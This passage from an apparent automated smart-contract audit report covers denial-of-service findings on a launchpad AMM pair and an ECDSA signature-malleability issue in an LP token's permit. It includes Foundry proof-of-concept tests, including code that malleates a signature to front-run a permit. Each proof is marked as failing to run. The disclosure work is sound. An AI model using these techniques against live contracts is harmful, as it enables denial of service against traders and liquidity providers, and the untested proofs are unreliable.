  - Clear accruedLaunchpadFee* and subtract totalLaunchpadFee* from reserves.
- If addRewards reverts for any reason, catch the error, leave accruedLaunchpadFee* intact, do not subtract from reserves, and set rewardsPoolActive = 0 to prevent further attempts. This avoids DoS and prevents excess, skim-able balances.

B) Interface addition (minimal, compile-time safe)
- Extend IDistributor with: function getRewardsPoolData(address launchAsset) external view returns (RewardPoolDataMemory memory).
- The Distributor already exposes this view; exposing it via the interface lets the pair check totalShares without introducing new trust or reentrancy.

Rationale
- Avoiding unconditional delete of accrued fees and reserve subtraction before a successful transfer prevents creating excess balances that can be skimmed.
- Guarding on totalShares > 0 avoids calling addRewards when it will revert, removing the DoS vector without silently swallowing fees.
- Flipping rewardsPoolActive to 0 when totalShares == 0 ensures no further accrual attempts and keeps swap/mint/burn functional.

Note: Do not implement a plain try/catch that ignores the revert while still deleting accrued fees and subtracting from reserves; that leaves tokens stranded in the pair and skimmable. Also avoid calling pair.endRewardsAccrual() from Distributor.addRewards during the callback (reentrancy into _update). The safe path is to keep pair-side checks and reorder updates as described.





 **Derived From** : StateMachine Invariant: Distributor / GTELaunchpadV2Pair / LaunchToken / Launchpad.RewardsTrackerLib.unstake / Distributor.decreaseStake / Distributor.endRewards / GTELaunchpadV2Pair.endRewardsAccrual / LaunchToken._decreaseFeeShares / Launchpad.endRewards

## [M-34]. Launchpad AMM pool can be permanently bricked when last fee-share holder exits after graduation

### Finding Severity Justification: Swaps on the Uniswap V2 pair become permanently unexecutable (DoS) once all fee-share stakes reach zero after graduation. This halts trading for that token pair but does not directly steal funds. Availability impact to a core protocol function merits Medium.
## Derived From Pattern/Invariant
StateMachine Invariant: Distributor / GTELaunchpadV2Pair / LaunchToken / Launchpad.RewardsTrackerLib.unstake / Distributor.decreaseStake / Distributor.endRewards / GTELaunchpadV2Pair.endRewardsAccrual / LaunchToken._decreaseFeeShares / Launchpad.endRewards

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair._distributeLaunchpadFees

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The intended state machine is that when there are no more fee-share holders / stakers for a launch asset, its associated rewards pool is deactivated and no further rewards are added. Otherwise, Uniswap-like swaps must remain functional.

Components:
- `LaunchToken.totalFeeShare` & `bondingShare[account]` track fee-sharing during bonding.
- `Distributor.RewardPoolData.totalShares` mirrors total fee shares for the launch asset.
- `GTELaunchpadV2Pair` tracks accrued launchpad fees and, when `rewardsPoolActive > 0`, periodically calls `IDistributor(distributor).addRewards(token0, token1, fee0, fee1)` in `_distributeLaunchpadFees`.
- `Distributor.addRewards` **reverts** if `rs.totalShares == 0` to prevent distributing to an empty pool:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

`endRewards` wiring:
- `LaunchToken._decreaseFeeShares` calls `_endRewards()` only when `totalFeeShare == 0 && !unlocked`:

```solidity
function _decreaseFeeShares(address account, uint256 amount) internal {
    ...
    unchecked {
        totalFeeShare -= amount;
        bondingShare[account] -= amount;
    }

    if (totalFeeShare == 0 && !unlocked) _endRewards();
    ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
}

function _endRewards() internal {
    ILaunchpad(launchpad).endRewards();
    emit FeeShareConcluded(block.timestamp, _incEventNonce());
}
```

- `Launchpad.endRewards` maps the launch token to its AMM pair and calls `distributor.endRewards(pair)`, which calls `pair.endRewardsAccrual()`. That zeroes `rewardsPoolActive` in the pair and clears pending fee accrual:

```solidity
function endRewards() external onlyLaunchAsset {
    address quote = _launches[msg.sender].quote;
    IGTELaunchpadV2Pair pair = IGTELaunchpadV2Pair(address(pairFor(address(uniV2Factory), msg.sender, quote)));
    distributor.endRewards(pair);
}

// In Distributor
function endRewards(IGTELaunchpadV2Pair pair) external onlyLaunchpad {
    pair.endRewardsAccrual();
}

// In GTELaunchpadV2Pair
function endRewardsAccrual() external {
    if (msg.sender != launchpadFeeDistributor) revert("GTEUniV2: FORBIDDEN");
    delete accruedLaunchpadFee0;
    delete accruedLaunchpadFee1;
    delete rewardsPoolActive;
    _update(..., uint112(0), uint112(0));
}
```

Crucially, `Launchpad._graduate` simply unlocks the token and marks `launches[token].active = false` without calling `endRewards`:

```solidity
function _graduate(...) internal returns (...) {
    LaunchToken(buyData.token).unlock();
    _launches[buyData.token].active = false;
    emit BondingLocked(...);
    ...
}
```

After graduation:
- `LaunchToken.unlocked == true`.
- The `_beforeTokenTransfer` hook still calls `_decreaseFeeShares(from, amount)` for any transfer where `from != launchpad` (no `unlocked` guard around this call):

```solidity
function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
    if (!unlocked && from != launchpad && to != launchpad && to != gteRouter) {
        revert TransfersDisabledWhileBonding();
    }
    ...
    if (from != launchpad) _decreaseFeeShares(from, amount);
}
```

As users transfer/sell tokens post-graduation, `_decreaseFeeShares` continues to run and decrements both `totalFeeShare` and Distributor shares until eventually **all fee-share holders exit and `totalFeeShare` == 0, `RewardPoolData.totalShares == 0`, but `unlocked == true`**.

Under this condition, the `if (totalFeeShare == 0 && !unlocked)` does not trigger, so `_endRewards()` is NEVER called in the post-unlock world.

Meanwhile:
- The AMM pair still has `rewardsPoolActive == 1` and a valid `launchpadFeeDistributor` address.
- On any subsequent swap, if there is positive launchpad fee, `_distributeLaunchpadFees` will be invoked:

```solidity
function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        ...
        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
        ...
    }
}
```

- Inside `Distributor.addRewards`, since `rs.totalShares == 0`, the call will revert with `NoSharesToIncentivize()`.

Result:
- **Any AMM swap on that pair after the last fee-share holder exits will revert**, bricking trading for that token pair on the AMM indefinitely.
- This is a pure functional DoS triggered by normal user behavior (selling all tokens after unlock).


## Impact
After a launch graduates (token unlocked), normal user transfers continue to call decreaseStake via LaunchToken._decreaseFeeShares. Once all holders exit and total shares drop to zero, the rewards pool remains active on the AMM pair while the Distributor rejects new rewards with NoSharesToIncentivize(). Any swap attempting to accrue launchpad fees will revert, making all swaps on that pair fail and bricking trading for the token on the AMM indefinitely. There is no owner/admin path to recover functionality once shares are zero, so availability is permanently impacted.

## Command to Run Test


## Proof of Concept
High-level PoC steps:
1) Create Distributor and initialize it with a MockLaunchpad as the authorized launchpad.
2) From MockLaunchpad, deploy a LaunchToken (so LaunchToken.launchpad = MockLaunchpad) and create the Distributor reward pool for (token, quote).
3) Simulate bonding: MockLaunchpad mints tokens to itself and transfers some to a user while the token is still locked. This increases per-user fee shares and calls distributor.increaseStake.
4) Graduate: MockLaunchpad calls token.unlock() (no call to endRewards).
5) Post-graduation, the user transfers away their entire balance. LaunchToken._decreaseFeeShares runs and calls distributor.decreaseStake until totalShares == 0 and totalFeeShare == 0. Because unlocked == true, _endRewards() is not called.
6) Simulate a swap fee distribution by directly calling distributor.addRewards(token, quote, 1, 0). Since totalShares == 0, the call reverts with NoSharesToIncentivize(), demonstrating that any pair swap distribution would brick.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {IDistributor} from "contracts/launchpad/interfaces/IDistributor.sol";

contract LaunchpadAmmBrickTest is Test {
    Distributor internal distributor;
    MockLaunchpad internal mockLp;
    address internal user = address(0xBEEF);
    address internal burn = address(0xDEAD);

    MockERC20 internal quote;
    address internal token;

    function setUp() public {
        // Deploy Distributor first
        distributor = new Distributor();
        // Deploy a minimal Launchpad mock that will be the authorized launchpad for Distributor
        mockLp = new MockLaunchpad(IDistributor(address(distributor)));
        // Authorize the mock launchpad in Distributor
        distributor.initialize(address(mockLp));

        // Mock quote token (only used for pair identity in rewards pool)
        quote = new MockERC20("Quote", "Q", 18);

        // Deploy a LaunchToken from the mock launchpad so its launchpad = mockLp
        token = mockLp.deployToken("Test", "T", address(0));

        // Create the rewards pair (token, quote) in Distributor
        mockLp.createRewardsPair(token, address(quote));

        // Fund user with nothing initially; mint and distribute bonding tokens from launchpad later
    }

    function test_AfterUnlock_LastShareExit_CausesAddRewardsRevert() public {
        uint256 minted = 1_000e18;
        // Simulate bonding: mint to launchpad and transfer to user while locked
        mockLp.mint(token, minted);
        mockLp.transferFromLaunchpad(token, user, 500e18); // increases fee shares and stakes in Distributor

        // Unlock (graduate) WITHOUT ending rewards
        mockLp.unlock(token);

        // User exits fully post-unlock -> decreases shares down to zero
        vm.startPrank(user);
        LaunchToken(token).transfer(burn, LaunchToken(token).balanceOf(user));
        vm.stopPrank();

        // Assert shares are zero in token and distributor
        assertEq(LaunchToken(token).totalFeeShare(), 0, "token totalFeeShare should be 0");
        {
            (uint96 totalShares,, , , ,) = distributor.getRewardsPoolData(token);
            assertEq(uint256(totalShares), 0, "distributor totalShares should be 0");
        }

        // Simulate the AMM pair trying to distribute launchpad fees
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        distributor.addRewards(token, address(quote), 1, 0);
    }
}

// Minimal Launchpad mock that proxies stake calls to the real Distributor.
contract MockLaunchpad {
    IDistributor public distributor;
    constructor(IDistributor d) { distributor = d; }

    // Deploy LaunchToken with this contract set as `launchpad`.
    function deployToken(string memory name, string memory symbol, address gteRouter) external returns (address) {
        LaunchToken t = new LaunchToken(name, symbol, "", gteRouter);
        return address(t);
    }

    // Token hooks call these (msg.sender == token address).
    function increaseStake(address account, uint96 shares) external { distributor.increaseStake(msg.sender, account, shares); }
    function decreaseStake(address account, uint96 shares) external { distributor.decreaseStake(msg.sender, account, shares); }

    // Set up rewards pool
    function createRewardsPair(address launchAsset, address quoteAsset) external { distributor.createRewardsPair(launchAsset, quoteAsset); }

    // Graduation helpers (onlyLaunchpad on token)
    function mint(address token, uint256 amount) external { LaunchToken(token).mint(amount); }
    function unlock(address token) external { LaunchToken(token).unlock(); }
    function transferFromLaunchpad(address token, address to, uint256 amount) external { LaunchToken(token).transfer(to, amount); }
}

// Simple ERC20 mock
contract MockERC20 {
    string public name; string public symbol; uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s, uint8 d) { name=n; symbol=s; decimals=d; }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount; return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender]; if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount; balanceOf[to] += amount; return true;
    }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
}


## Suggested Mitigation
Primary fix (state-machine correctness):
- In LaunchToken._decreaseFeeShares, remove the !unlocked guard so that endRewards() is invoked whenever totalFeeShare reaches zero, regardless of unlock status. This keeps the AMM pair’s rewardsPoolActive in sync with Distributor.shares and prevents addRewards calls when no recipients exist.

Example:

function _decreaseFeeShares(address account, uint256 amount) internal {
    uint256 share = bondingShare[account];
    if (share == 0 || account == address(0)) return;

    amount = amount > share ? share : amount;

    emit FeeShareDecreased(account, amount, _incEventNonce());

    unchecked {
        totalFeeShare -= amount;
        bondingShare[account] -= amount;
    }

    // Call endRewards even after unlock once the last share exits
    if (totalFeeShare == 0) _endRewards();

    ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
}

Defense-in-depth (optional but recommended):
- In GTELaunchpadV2Pair._distributeLaunchpadFees, wrap IDistributor(distributor).addRewards(...) in a try/catch. If it reverts with NoSharesToIncentivize or RewardsDoNotExist, set rewardsPoolActive = 0 (and emit an event) to prevent future swap DoS from fee accrual attempts. This ensures the pair self-disables rewards accrual when distribution is impossible, avoiding permanent bricking even if an edge case slips through.

Do not end rewards unconditionally at graduation; the above change preserves ongoing rewards for holders post-unlock and cleanly deactivates the pool when the last share exits.





 **Derived From** : Invariant Type: StateMachine

## [M-35]. Rewards pool can reach totalShares==0 post-unlock without disabling GTELaunchpadV2Pair accrual, bricking all future swaps

### Finding Severity Justification: A realistic, permissionless path can permanently DoS swaps on the GTELaunchpadV2Pair once rewards shares reach zero after token unlock. While no assets are directly stolen, the pair’s core functionality (swapping) becomes unavailable until migration, which is a significant protocol availability impact.
## Derived From Pattern/Invariant
Invariant Type: StateMachine

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair._distributeLaunchpadFees

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The intended state machine around launchpad AMM rewards is:

1. While there are bonding fee‑shares (`LaunchToken.totalFeeShare > 0` and `RewardPoolData.totalShares > 0`), `GTELaunchpadV2Pair` accrues a fraction of swap fees and forwards them to the `Distributor.addRewards` pool.
2. When the last fee‑share holder exits, both `LaunchToken.totalFeeShare` and `RewardPoolData.totalShares` drop to 0, and `endRewardsAccrual()` is called on the pair so it stops accruing launchpad fees.
3. If `addRewards` is ever called with `totalShares == 0`, it reverts with `NoSharesToIncentivize()` and should not happen in steady state.

Reality diverges because `LaunchToken._endRewards()` is only called while the token is still locked:

```solidity
function _decreaseFeeShares(address account, uint256 amount) internal {
    ...
    unchecked {
        totalFeeShare -= amount;
        bondingShare[account] -= amount;
    }

    if (totalFeeShare == 0 && !unlocked) _endRewards();

    ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
}

function _endRewards() internal {
    ILaunchpad(launchpad).endRewards();
    emit FeeShareConcluded(block.timestamp, _incEventNonce());
}
```

After graduation, `Launchpad._graduate` calls `LaunchToken.unlock()` and sets `_launches[token].active = false`, but **does not** call `endRewards()` at that time. After `unlocked == true`, further holder transfers will still run `_decreaseFeeShares` but the guard `if (totalFeeShare == 0 && !unlocked)` prevents `_endRewards()` from ever being called when the last holder exits post‑unlock.

`Launchpad.endRewards()` just forwards to the Distributor/pair:

```solidity
function endRewards() external onlyLaunchAsset {
    address quote = _launches[msg.sender].quote;
    IGTELaunchpadV2Pair pair = IGTELaunchpadV2Pair(address(pairFor(...)));
    distributor.endRewards(pair);
}

// Distributor
function endRewards(IGTELaunchpadV2Pair pair) external onlyLaunchpad {
    pair.endRewardsAccrual();
}

// Pair
function endRewardsAccrual() external {
    if (msg.sender != launchpadFeeDistributor) revert("GTEUniV2: FORBIDDEN");
    delete accruedLaunchpadFee0;
    delete accruedLaunchpadFee1;
    delete rewardsPoolActive;
    ...
}
```

At the same time, `GTELaunchpadV2Pair` will continue to attempt to add rewards on every swap while `launchpadFeeDistributor` and `rewardsPoolActive > 0`:

```solidity
function _update(..., uint112 newLaunchpadFee0, uint112 newLaunchpadFee1) private {
    ...
    uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
    uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;
    ...
    if (launchpadFeeDistributor > address(0)) {
        if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
            delete accruedLaunchpadFee0;
            delete accruedLaunchpadFee1;
            _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
        }
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        ...
        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
    }
}
```

But `Distributor.addRewards` reverts when there are no shares:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) = ...;
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        ...
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

Violation scenario:

1. Token T is launched; while bonding, fee shares accumulate and `RewardPoolData.totalShares(T) > 0`. GTELaunchpadV2Pair is created at graduation and `rewardsPoolActive == 1`.
2. After unlock, holders transfer/sell T so that `LaunchToken.totalFeeShare` and Distributor `totalShares(T)` are slowly reduced via `_decreaseFeeShares` / `Distributor.decreaseStake`.
3. Eventually, the last fee‑share holder exits **after** `unlocked == true`, setting `totalFeeShare == 0` and `rs.totalShares == 0` but never triggering `_endRewards()` because of `!unlocked` guard.
4. `GTELaunchpadV2Pair` still has `rewardsPoolActive == 1` and `launchpadFeeDistributor` set. On the next swap that yields a non‑zero launchpad fee, `_distributeLaunchpadFees` calls `Distributor.addRewards`, which sees `totalShares == 0` and reverts `NoSharesToIncentivize()`.
5. From that point on, any swap that generates launchpad fees on this pair will revert, effectively **bricking the AMM pair**.

This violates the invariant that, once no shares remain, either the rewards pool is deactivated (and no more addRewards happen) or calls to `addRewards` do not occur. The bug is reachable by **normal user trading/transfer behavior** and can permanently DoS the pair.


## Impact
When Distributor.totalShares for a launched token reaches zero after the token has been unlocked, GTELaunchpadV2Pair continues accruing and attempting to forward rewards because endRewardsAccrual is never invoked (LaunchToken only calls it while locked). Any subsequent swap that generates a non-zero launchpad fee will attempt Distributor.addRewards and revert with NoSharesToIncentivize. This permissionless and realistic state transition permanently DoS-es swaps on that pair (end users cannot trade through the AMM) until a protocol upgrade or manual on-chain fix, causing severe availability impact to that market.

## Command to Run Test


## Proof of Concept
Attack narrative (concise):
1) A LaunchToken graduates to AMM and unlocks transfers. Pair is initialized with a non-zero launchpadFeeDistributor and rewardsPoolActive == 1.
2) Users continue transferring/selling the token; LaunchToken._decreaseFeeShares keeps calling Launchpad.decreaseStake, eventually driving Distributor.RewardPoolData.totalShares to 0.
3) Because LaunchToken._decreaseFeeShares only calls _endRewards() when !unlocked, endRewardsAccrual() on the pair is never called post-unlock. The pair still accrues launchpad fees.
4) On the next swap that produces non-zero launchpad fees, the pair calls Distributor.addRewards, which reverts with NoSharesToIncentivize, bricking swaps on this pair indefinitely.

Key invariant violated: When no reward shares remain, the pair must stop trying to add rewards. Current code continues, leading to revert-on-swap DoS.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {IDistributor} from "contracts/launchpad/interfaces/IDistributor.sol";
import {ERC20} from "solady/tokens/ERC20.sol";

contract TestToken is ERC20 {
    string internal _n; string internal _s; uint8 internal _d;
    constructor(string memory n, string memory s, uint8 d) { _n = n; _s = s; _d = d; }
    function name() public view override returns (string memory){ return _n; }
    function symbol() public view override returns (string memory){ return _s; }
    function decimals() public view override returns (uint8){ return _d; }
    function mint(address to, uint256 a) external { _mint(to, a); }
}

// Minimal launchpad stub to satisfy Distributor.onlyLaunchpad
contract LaunchpadStub {
    IDistributor public immutable distributor;
    constructor(IDistributor d) { distributor = d; }
    function createRewardsPair(address launchAsset, address quoteAsset) external {
        distributor.createRewardsPair(launchAsset, quoteAsset);
    }
    function increaseStake(address launchAsset, address account, uint96 shares) external {
        distributor.increaseStake(launchAsset, account, shares);
    }
    function decreaseStake(address launchAsset, address account, uint96 shares) external {
        distributor.decreaseStake(launchAsset, account, shares);
    }
}

contract PairBricksOnZeroSharesTest is Test {
    TestToken token0; // launch asset
    TestToken token1; // quote asset
    Distributor distributor;
    LaunchpadStub lpStub;
    GTELaunchpadV2Pair pair;

    address launchpadLp = address(0xAA11);
    address maker = address(0xBEEF);
    address trader = address(0xCAFE);

    function setUp() public {
        token0 = new TestToken("BASE","BASE",18);
        token1 = new TestToken("QUOTE","QUOTE",18);

        distributor = new Distributor();
        // set test contract as owner already in constructor; initialize launchpad address
        lpStub = new LaunchpadStub(IDistributor(address(distributor)));
        distributor.initialize(address(lpStub));

        // Deploy pair; this test contract is the factory
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), launchpadLp, address(distributor));

        // Initialize rewards pool and then drive shares > 0 then back to 0
        lpStub.createRewardsPair(address(token0), address(token1));
        lpStub.increaseStake(address(token0), maker, uint96(1000));
        lpStub.decreaseStake(address(token0), maker, uint96(1000)); // totalShares -> 0

        // Seed initial liquidity to the pair so swaps are possible
        token0.mint(address(pair), 1e18);
        token1.mint(address(pair), 1e18);
        pair.mint(launchpadLp); // LP minted to launchpadLp

        // Ensure a new timestamp so _update() goes into the distribution branch (timeElapsed > 0)
        vm.warp(block.timestamp + 1);

        // Fund trader with input token
        token0.mint(trader, 1e17);
    }

    function test_SwapsRevertWhenTotalSharesZero() public {
        // Trader sends input (amount0In) to pair before swap, typical UniV2 usage
        vm.startPrank(trader);
        token0.transfer(address(pair), 1e17);
        // addRewards will be attempted inside _update() and must revert due to rs.totalShares == 0
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 1e15, trader, ""); // any non-zero out to trigger fee accrual/distribution
        vm.stopPrank();
    }
}


## Suggested Mitigation
Ensure the pair is deactivated (endRewardsAccrual) whenever reward shares reach zero, regardless of token lock state, so the pair will stop attempting Distributor.addRewards.

Concrete changes:
- In LaunchToken._decreaseFeeShares, remove the unlocked gate so endRewards() is called whenever totalFeeShare drops to zero:
  // before: if (totalFeeShare == 0 && !unlocked) _endRewards();
  // after:  if (totalFeeShare == 0) _endRewards();

- Additionally, as a safety net, consider calling endRewards on unlock if there are already zero fee shares:
  function unlock() external onlyLaunchpad {
      unlocked = true;
      emit TransfersUnlocked(block.timestamp, _incEventNonce());
      if (totalFeeShare == 0) _endRewards();
  }

These changes guarantee Distributor.endRewards(pair) -> pair.endRewardsAccrual() is invoked in all zero-share scenarios, preventing the pair from calling addRewards when rs.totalShares == 0 and preserving swap availability.

Optionally (belt-and-suspenders): add a non-reverting path in Distributor.addRewards for zero-share cases by early-returning without state changes, but only if you also prevent clearing pending rewards when totalShares == 0. The primary fix above (ending pair accrual) is simpler and preserves intended accounting semantics.





 **Derived From** : PermitMisuse

## [L-36]. UniswapV2-style LP token permit lacks low-s and v validation, allowing signature malleability

### Finding Severity Justification: The permit implementation in UniswapV2ERC20 (inherited by the LP token) does not enforce low-s or strict v checks, allowing ECDSA signature malleability. While this can cause signature non-uniqueness and potential front-run/DoS of a user’s permit call in integrations relying on atomic permit+action flows, nonces prevent replay within the contract and there is no direct asset theft or loss. Impact is thus limited to reliability/UX and off-chain assumptions, fitting QA/Low.
## Derived From Pattern/Invariant
PermitMisuse

## Exploit Type
SignatureMalleability

## Location
UniswapV2ERC20.permit

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The LP token used by GTELaunchpadV2Pair inherits UniswapV2ERC20, which implements an EIP-2612-style permit without enforcing standard anti-malleability checks on the ECDSA signature parameters v and s.

Relevant code in UniswapV2ERC20:

```solidity
bytes32 public DOMAIN_SEPARATOR;
bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
mapping(address => uint256) public nonces;

function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
) external {
    require(deadline >= block.timestamp, "UniswapV2: EXPIRED");
    bytes32 digest = keccak256(
        abi.encodePacked(
            "\x19\x01",
            DOMAIN_SEPARATOR,
            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
        )
    );
    address recoveredAddress = ecrecover(digest, v, r, s);
    require(recoveredAddress != address(0) && recoveredAddress == owner, "UniswapV2: INVALID_SIGNATURE");
    _approve(owner, spender, value);
}
```

Issues:
- There is **no check that s is in the lower half** of the secp256k1 curve order (low-s rule). For any valid (v, r, s) signature, an attacker can compute an alternative (v', r, s') with s' = n - s that also recovers to the same address for the same digest.
- There is **no check that v is 27 or 28** (or normalized from 0/1), deviating from the common EIP-2/EIP-712 expectations.

Consequences:
- The same logical permit (same digest) can be represented by multiple distinct (v, r, s) triples that are all accepted by the contract. While the nonce in the signed data prevents unlimited replay of *exactly the same* triple, an attacker or relayer with access to an off-chain signature can malleate it into an alternative form and front‑run the user’s intended permit usage (e.g., in a meta-tx or batched router call).
- This breaks assumptions of uniqueness for signatures and can interact badly with external systems that assume non‑malleable signatures or cache signatures by their (r, s) pair.

This matches the SignatureMalleability / PermitMisuse pattern: the contract exposes a widely used permit function but does not implement standard low-s and v-range checks recommended for robust EIP-2612 implementations.

## Impact
ECDSA malleability in UniswapV2-style permit allows both the canonical low-s and the malleated high-s (v flipped, s = n - s) signature forms to be accepted for the same message. Although nonces prevent replay within the contract and the attacker cannot change any signed fields (value, spender, deadline), a relayer can front-run a user’s intended atomic permit+action (e.g., router) by submitting the malleated signature first. This consumes the nonce, causing the user’s subsequent permit to revert and breaking atomicity. Impact is reliability/DoS against integrations and off-chain systems that assume signature uniqueness; no direct loss of funds.

## Command to Run Test


## Proof of Concept
1) User signs a permit message (owner, spender, value, deadline, nonce) producing a canonical low-s signature (v, r, s).
2) An observer computes a malleated signature for the same digest: s' = n - s and v' = v XOR 1, which also recovers to owner.
3) Because the contract does not enforce low-s, both (v, r, s) and (v', r, s') are valid for that digest. Any address can call permit.
4) The attacker front-runs by calling permit(owner, spender, value, deadline, v', r, s'), which succeeds and consumes the nonce.
5) The user’s atomic transaction that calls permit with (v, r, s) then fails (INVALID_SIGNATURE) due to the nonce having changed, breaking the atomic permit+action flow. Note: The attacker cannot change value/spender/deadline; the DoS stems from consuming the nonce with an alternative valid signature representation.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {UniswapV2ERC20} from "@gte-univ2-core/UniswapV2ERC20.sol";

contract PermitMalleabilityTest is Test {
    UniswapV2ERC20 lp;
    address owner;
    uint256 ownerPk;
    address spender;

    // secp256k1 curve order
    uint256 constant SECP256K1N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function setUp() public {
        lp = new UniswapV2ERC20();
        ownerPk = 0xA11CE;
        owner = vm.addr(ownerPk);
        spender = vm.addr(0xB0B);
    }

    function test_highSSignatureAccepted_and_CausesDOS() public {
        uint256 value = 123e18;
        uint256 deadline = block.timestamp + 1 days;

        // Build EIP-712 digest with current nonce (0 for fresh owner)
        bytes32 structHash = keccak256(
            abi.encode(
                lp.PERMIT_TYPEHASH(),
                owner,
                spender,
                value,
                lp.nonces(owner),
                deadline
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", lp.DOMAIN_SEPARATOR(), structHash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);

        // Malleate signature: s' = n - s, flip v parity
        uint256 sNum = uint256(s);
        assertGt(sNum, 0);
        bytes32 sMalleated = bytes32(SECP256K1N - sNum);
        uint8 vMalleated = v ^ 1; // 27 <-> 28

        // Attacker front-runs with malleated high-s signature
        vm.prank(address(0xBEEF));
        lp.permit(owner, spender, value, deadline, vMalleated, r, sMalleated);

        // Allowance set; proves high-s signature is accepted
        assertEq(lp.allowance(owner, spender), value);

        // User's original atomic permit now fails due to nonce consumption
        vm.expectRevert(bytes("UniswapV2: INVALID_SIGNATURE"));
        lp.permit(owner, spender, value, deadline, v, r, s);
    }
}


## Suggested Mitigation
Enforce canonical ECDSA signatures in permit: (1) Reject high-s by requiring uint256(s) <= SECP256K1N/2; (2) Restrict v to 27 or 28 (or normalize 0/1 to 27/28 before enforcing). Prefer using OpenZeppelin’s ECDSA.recover which already validates s-range and supports EIP-2098 compact signatures. Example: require(deadline >= block.timestamp); address recovered = ECDSA.recover(digest, v, r, s); require(recovered == owner, "INVALID_SIGNATURE"); This removes signature malleability at the contract level and restores uniqueness assumptions for integrators.





 **Derived From** : Launchpad fee distribution callback can brick AMM pair if Distributor reverts

## [H-37]. External Distributor callback in _update can DoS swaps and LP operations if it reverts

### Finding Severity Justification: An unguarded external call to the Distributor in the AMM’s critical _update() path can permanently revert swaps, mint, burn, sync, and endRewardsAccrual. If the Distributor reverts, LPs cannot withdraw (burn reverts) and trading is halted, effectively freezing user assets in the pair. This constitutes asset unavailability/loss of access, warranting High severity.
## Derived From Pattern/Invariant
Launchpad fee distribution callback can brick AMM pair if Distributor reverts

## Exploit Type
Dos

## Location
GTELaunchpadV2Pair.swap

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
GTELaunchpadV2Pair's core AMM state update function _update() unconditionally calls an external Distributor contract via _distributeLaunchpadFees() whenever launchpad fees have accumulated and time has elapsed. This external call is made without any try/catch, gas limit, or failure-handling fallback. If IDistributor.addRewards() reverts for any reason, then the entire _update() call reverts, which in turn causes every upstream AMM action (swap, mint, burn, sync, endRewardsAccrual) that relies on _update() to revert as well.

Relevant code:

    function _update(
        uint256 balance0,
        uint256 balance1,
        uint112 _reserve0,
        uint112 _reserve1,
        uint112 newLaunchpadFee0,
